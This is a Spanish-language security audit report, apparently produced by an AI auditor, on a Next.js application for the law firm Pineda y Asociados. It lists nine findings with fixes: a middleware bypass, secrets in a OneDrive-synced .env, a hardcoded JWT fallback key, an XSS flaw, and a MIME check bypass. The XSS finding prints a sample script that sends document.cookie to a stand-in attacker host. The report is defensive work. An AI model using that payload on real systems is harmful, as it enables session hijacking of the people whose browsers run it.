# REPORTE DE HALLAZGOS DE AUDITORÍA
**Repositorio:** Justicia Verdadera (Pineda y Asociados)  
**Fecha:** 12 de Julio de 2026  
**Auditor Principal:** Auditor Senior de Ciberseguridad (Gemini 3.5)  

---

## 1. Resumen de Hallazgos por Severidad
*   **Crítica:** 2
*   **Alta:** 2
*   **Media:** 2
*   **Baja / Informativa:** 3
*   **Total de Hallazgos:** 9

---

## 2. Detalle de Hallazgos

### GEMINI35-SEC-01: Ausencia del archivo `middleware.ts` (Bypass de Seguridad en Edge)
*   **Categoría:** Ciberseguridad / Control de Acceso
*   **Ubicación Exacta:** Raíz del repositorio ([proxy.ts](file:///c:/Proyectos/Justicia%20Verdadera/proxy.ts))
*   **Evidencia Reproducible:** 
    1. Se inspecciona la raíz del repositorio y se confirma la ausencia del archivo `middleware.ts`.
    2. Se ejecuta un escaneo de archivos del repositorio (`Get-ChildItem`) y no se detecta ningún archivo con nombre `middleware` en el espacio de código del desarrollador.
    3. Aunque `proxy.ts` exporta una función `proxy(request)` que valida tokens, cookies y restringe el acceso de roles, Next.js no sabe de su existencia y no la ejecuta al procesar peticiones entrantes.
*   **Impacto:** Crítico. Toda la seguridad de control de acceso basada en roles e identidades para las páginas de la intranet (`/intranet/sgie/*` y `/intranet/admin/*`) queda deshabilitada en el lado del servidor. Un atacante externo puede enviar peticiones HTTP directas (ej. a través de `curl` o deshabilitando JavaScript en su navegador) y saltarse por completo el proxy de Next.js, descargando y renderizando la UI inicial del cockpit del abogado o del administrador. Aunque las APIs devuelven 401/403 porque validan a nivel de handler, la estructura de la intranet y los datos expuestos en el HTML/JavaScript inicial son filtrables.
*   **Probabilidad:** Alta
*   **Severidad:** **Crítica**
*   **Solución Recomendada:** Crear un archivo `middleware.ts` en la raíz del proyecto (a la misma altura que `app/`) que importe la función de redirección de `proxy.ts` y la exporte como middleware por defecto de Next.js:
    ```typescript
    import { NextRequest } from 'next/server';
    import { proxy } from './proxy';
    export function middleware(request: NextRequest) {
      return proxy(request);
    }
    export const config = {
      matcher: [
        '/((?!_next/static|_next/image|favicon.ico|manifest.json|icon-192\\.png|icon-512\\.png|apple-touch-icon\\.png|images/|BingSiteAuth\\.xml|.*\\.txt).*)',
      ],
    };
    ```
*   **Criterio de Aceptación:** Al intentar acceder a `/intranet/sgie` mediante un script `curl` sin cookies de sesión, el servidor de producción debe retornar inmediatamente un redirect 307 hacia `/intranet/login`.

---

### GEMINI35-SEC-02: Exposición de Secretos de Producción en el Archivo `.env` local y Nube OneDrive
*   **Categoría:** Ciberseguridad / Fuga de Credenciales
*   **Ubicación Exacta:** Raíz del repositorio ([.env](file:///c:/Proyectos/Justicia%20Verdadera/.env))
*   **Evidencia Reproducible:** 
    1. Se visualizan las líneas del archivo `.env` en la raíz del proyecto.
    2. Se constatan los siguientes secretos de producción en claro:
       - `DATABASE_URL` (Contraseña de conexión Neon PostgreSQL).
       - `GITHUB_PERSONAL_ACCESS_TOKEN` (Token de Acceso Personal).
       - `VERCEL_TOKEN` (API Token de Vercel).
       - `CLOUDING_API_KEY` y `CLOUDING_SSH_KEY` (Clave de VPS y SSH).
    3. El comentario de la línea 1 del archivo dice: *"La contraseña actual está expuesta en este archivo local (OneDrive)"*.
*   **Impacto:** Crítico. Aunque el archivo `.env` está en `.gitignore` y no se sube a GitHub en los commits activos, su almacenamiento físico local en un directorio sincronizado automáticamente con una nube personal (OneDrive) expone las credenciales de base de datos de producción y los tokens de infraestructura a posibles filtraciones externas si la cuenta de la nube o la máquina local se ven comprometidas.
*   **Probabilidad:** Media
*   **Severidad:** **Crítica**
*   **Solución Recomendada:** 
    1. Rotar inmediatamente todas las claves expuestas en Neon, GitHub, Vercel y Clouding.
    2. Eliminar por completo el archivo físico `.env` de la raíz del proyecto.
    3. Configurar todas las credenciales locales de desarrollo exclusivamente en el archivo `.env.local` (el cual está protegido de subirse al repo y no contiene fallbacks de producción).
    4. Deshabilitar la sincronización de nubes públicas en la carpeta de desarrollo del proyecto.
*   **Criterio de Aceptación:** Verificación visual de que el archivo `.env` no existe físicamente en el repositorio y que todas las credenciales antiguas han sido revocadas e invalidadas en sus respectivos paneles de administración.

---

### GEMINI35-SEC-03: Fallback Inseguro de Clave de Firma JWT en Vista Previa
*   **Categoría:** Ciberseguridad / Criptografía
*   **Ubicación Exacta:** 
    - [app/(public)/preview/[token]/page.tsx:L5](file:///c:/Proyectos/Justicia%20Verdadera/app/(public)/preview/[token]/page.tsx#L5)
    - [app/api/admin/preview/route.ts:L6](file:///c:/Proyectos/Justicia%20Verdadera/app/api/admin/preview/route.ts#L6)
*   **Evidencia Reproducible:** 
    - Ambos archivos contienen la siguiente línea:
      ```typescript
      const PREVIEW_SECRET = process.env.JWT_SECRET || 'dev-only-secret-not-for-production-min-32-chars-AAAAA';
      ```
*   **Impacto:** Alto. Si en producción ocurre un error de inicialización o una falla en la lectura de la variable de entorno `JWT_SECRET`, la aplicación utilizará por defecto la cadena estática como firma de verificación. Un atacante externo que conozca este código fuente abierto podrá firmar sus propios tokens JWT maliciosos con esa clave pública de desarrollo y acceder libremente a las rutas y recursos de vista previa.
*   **Probabilidad:** Media
*   **Severidad:** **Alta**
*   **Solución Recomendada:** Eliminar el fallback de desarrollo en producción. Si la variable de entorno no está configurada, el sistema debe lanzar una excepción y abortar la ejecución:
    ```typescript
    if (!process.env.JWT_SECRET) {
      throw new Error('JWT_SECRET no configurada.');
    }
    const PREVIEW_SECRET = process.env.JWT_SECRET;
    ```
*   **Criterio de Aceptación:** Al intentar levantar la aplicación con `JWT_SECRET` vacío, el sistema debe fallar inmediatamente y no permitir firmas con el token de fallback.

---

### GEMINI35-SEC-04: Vulnerabilidad de XSS Reflejado en Vista Previa
*   **Categoría:** Ciberseguridad / Inyección de Código (XSS)
*   **Ubicación Exacta:** [app/(public)/preview/[token]/page.tsx:L55-L58](file:///c:/Proyectos/Justicia%20Verdadera/app/(public)/preview/[token]/page.tsx#L55-L58)
*   **Evidencia Reproducible:** 
    - La página de vista previa utiliza:
      ```typescript
      <div
        className="prose prose-gray max-w-none"
        dangerouslySetInnerHTML={{ __html: payload.body }}
      />
      ```
*   **Impacto:** Alto. El cuerpo del post (`payload.body`) se recupera directamente del token JWT firmado y se inyecta en el DOM sin ningún tipo de sanitización HTML. Si un atacante compromete la clave secreta o explota el bypass de firma JWT del hallazgo GEMINI35-SEC-03, puede generar un token que contenga scripts de JavaScript maliciosos (ej. `<script>fetch('http://atacante.com/cookie?='+document.cookie)</script>`). Al enviar este enlace a un administrador o abogado de Pineda y Asociados, el JavaScript se ejecutará en su navegador con acceso a su sesión de la intranet.
*   **Probabilidad:** Media
*   **Severidad:** **Alta**
*   **Solución Recomendada:** Sanitizar la cadena HTML antes de inyectarla en el DOM utilizando la librería `sanitize-html` ya disponible en las dependencias del proyecto:
    ```typescript
    import sanitizeHtml from 'sanitize-html';
    // ...
    const bodySaneado = sanitizeHtml(payload.body, {
      allowedTags: sanitizeHtml.defaults.allowedTags.concat(['img', 'h1', 'h2']),
      allowedAttributes: {
        ...sanitizeHtml.defaults.allowedAttributes,
        'img': ['src', 'alt', 'width', 'height'],
      }
    });
    // ...
    <div dangerouslySetInnerHTML={{ __html: bodySaneado }} />
    ```
*   **Criterio de Aceptación:** Intentar inyectar una etiqueta `<script>alert(1)</script>` en el cuerpo del preview debe resultar en la eliminación automática de la etiqueta por parte de la librería de sanitización, impidiendo la ejecución de JavaScript en el navegador.

---

### GEMINI35-DATA-05: Inconsistencias de Datos y Penas Nulas (`0-0`) en Catálogo de Delitos
*   **Categoría:** Calidad de Datos / Lógica de Negocio
*   **Ubicación Exacta:** [data/delitos.json](file:///c:/Proyectos/Justicia Verdadera/data/delitos.json) y reporte generado en `data/auditoria-delitos-report.json`.
*   **Evidencia Reproducible:**
    - Se ejecuta el script de auditoría de delitos: `npm run audit:delitos`.
    - La auditoría reporta **25 delitos críticos con prisión `0-0`** (`PRISION_SIN_VALOR`), entre ellos el delito *"Privación ilegal de libertad"* (Art. 235 CP) y *"Chantaje"* (Art. 247 CP).
    - Asimismo, la totalidad de los 483 delitos carecen de clasificación (`SIN_CLASIFICACION`) y 142 de ellos carecen de rama jurídica (`SIN_RAMA`).
*   **Impacto:** Medio. Al realizar cálculos de penas para estos 25 delitos, el motor de reglas calculará rangos de prisión vacíos o nulos, lo que induce al abogado a error en el cockpit de expedientes o muestra resultados inválidos en la calculadora pública. Asimismo, la ausencia de ramas y clasificaciones empobrece las capacidades del RAG semántico para recuperar supuestos relacionados.
*   **Probabilidad:** Alta
*   **Severidad:** **Media**
*   **Solución Recomendada:** 
    1. Revisar los artículos del Código Penal de Honduras para los 25 delitos listados como nulos e introducir los límites inferior y superior correctos en `data/delitos.json`.
    2. Completar las propiedades de clasificación y ramas jurídicas de los delitos en base a las fuentes canónicas.
*   **Criterio de Aceptación:** Al ejecutar `npm run audit:delitos`, la categoría `PRISION_SIN_VALOR` debe reportar 0 incidencias.

---

### GEMINI35-ARCH-06: Desincronización y Configuración Errónea en Embeddings RAG
*   **Categoría:** Arquitectura / Inconsistencia de Configuración
*   **Ubicación Exacta:** [lib/rag/config.ts:L33-L51](file:///c:/Proyectos/Justicia%20Verdadera/lib/rag/config.ts#L33-L51) y [lib/rag/embeddings.ts](file:///c:/Proyectos/Justicia%20Verdadera/lib/rag/embeddings.ts)
*   **Evidencia Reproducible:**
    - La documentación canónica `AGENTS.md` instruye el uso de **DeepSeek** (`deepseek-embedding`) como proveedor principal de embeddings del RAG.
    - Sin embargo, `config.ts` utiliza:
      ```typescript
      provider: process.env.EMBEDDINGS_PROVEEDOR || 'openai',
      model: process.env.EMBEDDINGS_MODELO || 'text-embedding-3-small',
      ```
    - El archivo local `.env.local` configura `EMBEDDINGS_PROVEEDOR=openai` y `EMBEDDINGS_MODELO=text-embedding-3-small`.
*   **Impacto:** Medio. Se está utilizando un proveedor y modelo de embeddings diferente al canónicamente diseñado para la base de conocimiento vectorial de Pineda y Asociados. Esto puede generar inconsistencias semánticas drásticas o fallas de recuperación (similitud de coseno errónea) si el índice de pgvector se pobló parcialmente usando DeepSeek en lugar de OpenAI.
*   **Probabilidad:** Alta
*   **Severidad:** **Media**
*   **Solución Recomendada:** Sincronizar las variables de entorno locales `.env.local` y los valores por defecto en `config.ts` para que utilicen consistentemente el proveedor y modelo establecido en el protocolo (`deepseek` y `deepseek-embedding`).
*   **Criterio de Aceptación:** El test de recuperación semántica del chat y la indexación de PDFs debe funcionar en verde utilizando exclusivamente la API key de DeepSeek.

---

### GEMINI35-ARCH-07: Elisión del Filtro de Tipos MIME en Carga de Documentos
*   **Categoría:** Ciberseguridad / Evasión de Controles
*   **Ubicación Exacta:** [lib/sgie/util.ts:L135-L144](file:///c:/Proyectos/Justicia%20Verdadera/lib/sgie/util.ts#L135-L144)
*   **Evidencia Reproducible:**
    - La función `validarArchivoCarga` delega la detección del MIME real a `detectarMimePorMagicBytes`.
    - Sin embargo, `detectarMimePorMagicBytes` sólo tiene firmas de magic bytes para PDF, JPEG, PNG y WebP.
    - Si el archivo declara ser `.docx`, la función devuelve `mimeReal = null` y se toma por defecto el MIME declarado por el cliente:
      ```typescript
      return { ok: true, mimeReal: mimeReal ?? mimeDeclarado };
      ```
*   **Impacto:** Bajo. Un atacante puede engañar al backend subiendo un script malicioso en formato ejecutable o HTML con la extensión renombrada a `.docx` y estableciendo el tipo MIME de la petición a `application/vnd.openxmlformats-officedocument.wordprocessingml.document`. El control de magic bytes no se activará y el archivo se subirá a Vercel Blob, evadiendo la verificación de contenido real. Aunque se prohíben extensiones ejecutables como `.exe` o `.php` en la lista negra de extensiones, esta debilidad permite almacenar archivos arbitrarios en el almacenamiento blob del cliente.
*   **Probabilidad:** Alta
*   **Severidad:** **Baja**
*   **Solución Recomendada:** Incorporar firmas básicas de magic bytes para el resto de formatos permitidos en el array `MAGIC_BYTES` (como los archivos zip/docx que inician con la firma `[0x50, 0x4b, 0x03, 0x04]` correspondiente a contenedores ZIP).
*   **Criterio de Aceptación:** Intentar subir un script renombrado a `.docx` debe ser detectado como inconsistente y rechazado en la carga.

---

### GEMINI35-PERF-08: Alta Carga de Escrituras por Rate Limiting en PostgreSQL (Neon)
*   **Categoría:** Rendimiento / Resiliencia
*   **Ubicación Exacta:** [lib/rate-limit.ts:L50-L66](file:///c:/Proyectos/Justicia%20Verdadera/lib/rate-limit.ts#L50-L66)
*   **Evidencia Reproducible:**
    - El rate limiter realiza una consulta de inserción y actualización en base de datos (`INSERT ... ON CONFLICT DO UPDATE` en la tabla `rate_limits` de Neon) en cada petición a rutas sensibles.
*   **Impacto:** Bajo / Informativo. Bajo ataques de denegación de servicio (DoS) o fuerza bruta automatizada sobre el login de la intranet, el servidor web serverless inundará la base de datos Neon con miles de escrituras por segundo para almacenar los contadores de rate-limit. Esto aumentará significativamente los costos de facturación de cómputo/CPU de Neon y ralentizará el tiempo de respuesta general del servidor web.
*   **Probabilidad:** Alta
*   **Severidad:** **Baja**
*   **Solución Recomendada:** Migrar la lógica de rate limiting a una base de datos en memoria rápida como Redis (ej. Upstash Redis, que ya tiene soporte de configuración en las dependencias) o configurar reglas de limitación en el Edge Middleware / Firewall de Vercel para descartar peticiones maliciosas antes de que lleguen al cómputo serverless de Next.js y base de datos.
*   **Criterio de Aceptación:** El rate limit bloquea el tráfico de ataque sin generar escrituras adicionales en la base de datos PostgreSQL Neon.

---

### GEMINI35-QUAL-09: Duplicidad y Ruido en el archivo `.gitignore`
*   **Categoría:** Calidad de Código / Deuda Técnica
*   **Ubicación Exacta:** [c:\Proyectos\Justicia Verdadera\.gitignore](file:///c:/Proyectos/Justicia%20Verdadera/.gitignore)
*   **Evidencia Reproducible:**
    - El archivo `.gitignore` repite exactamente el mismo bloque de exclusiones (líneas 1 a 157) a partir de la línea 158 en adelante.
*   **Impacto:** Informativo. Aumenta innecesariamente el tamaño del archivo `.gitignore`, dificulta la lectura y mantenimiento de las exclusiones del repositorio y demuestra falta de control de calidad estático sobre los archivos de configuración del repositorio.
*   **Probabilidad:** N/A (Estático)
*   **Severidad:** **Informativa**
*   **Solución Recomendada:** Eliminar las líneas duplicadas (desde la línea 158 hasta la 348) del archivo `.gitignore`.
*   **Criterio de Aceptación:** El archivo `.gitignore` tiene una sola declaración de reglas limpia y ordenada, sin bloques repetidos.
